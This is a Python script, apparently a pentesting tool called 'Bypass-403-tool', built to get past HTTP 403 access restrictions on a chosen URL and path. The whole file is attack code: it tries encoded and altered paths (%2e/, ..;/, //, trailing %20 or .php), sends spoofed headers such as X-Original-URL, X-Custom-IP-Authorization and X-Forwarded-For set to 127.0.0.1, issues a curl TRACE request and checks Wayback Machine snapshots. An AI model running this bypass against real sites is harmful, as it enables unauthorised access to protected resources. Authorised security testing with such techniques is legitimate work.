import subprocess
import requests
import json

def bypass_403(url, path):
    print("Bypass-403-tool")
    print("By Trojanhax")
    print(f"./bypass-403.py {url} {path}\n")
    
    def make_request(url, path):
        response = requests.get(url + "/" + path, verify=False)
        print(f"  --> {url}/{path}: {response.status_code}, {len(response.content)} bytes")
    
    make_request(url, path)
    make_request(url, "%2e/" + path)
    make_request(url, path + "/.")
    make_request(url, "//" + path + "//")
    make_request(url, "/./" + path + "/./")
    
    headers = {
        "X-Original-URL": path,
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Forwarded-For": "http://127.0.0.1",
        "X-Forwarded-For": "127.0.0.1:80",
        "X-rewrite-url": path
    }
    
    for header, value in headers.items():
        response = requests.get(url + "/" + path, headers={header: value}, verify=False)
        print(f"  --> {url}/{path} -H {header}: {value}: {response.status_code}, {len(response.content)} bytes")
    
    make_request(url, path + "%20")
    make_request(url, path + "%09")
    make_request(url, path + "?")
    make_request(url, path + ".html")
    make_request(url, path + "/?anything")
    make_request(url, path + "#")
    make_request(url, path + "/*")
    make_request(url, path + ".php")
    make_request(url, path + ".json")
    make_request(url, path)
    
    subprocess.call(["curl", "-X", "TRACE", url + "/" + path])
    print(f"  --> {url}/{path} -X TRACE")
    
    response = requests.get(url + "/" + path, headers={"X-Host": "127.0.0.1"}, verify=False)
    print(f"  --> {url}/{path} -H X-Host: 127.0.0.1: {response.status_code}, {len(response.content)} bytes")
    
    response = requests.get(url + "/" + path + "..;/", verify=False)
    print(f"  --> {url}/{path}..;/: {response.status_code}, {len(response.content)} bytes")
    
    response = requests.get(url + "/" + path + ";/", verify=False)
    print(f"  --> {url}/{path};/: {response.status_code}, {len(response.content)} bytes")
    
    print("\nWay back machine:")
    response = requests.get(f"https://archive.org/wayback/available?url={url}/{path}")
    data = response.json()
    if "archived_snapshots" in data:
        if "closest" in data["archived_snapshots"]:
            available = data["archived_snapshots"]["closest"]["available"]
            archive_url = data["archived_snapshots"]["closest"]["url"]
            print(f"Available: {available}, URL: {archive_url}")
        else:
            print("No closest snapshot available")
    else:
        print("No archived snapshots available")

if __name__ == "__main__":
    url = input("Enter the base URL: ")
    path = input("Enter the path: ")
    bypass_403(url, path)
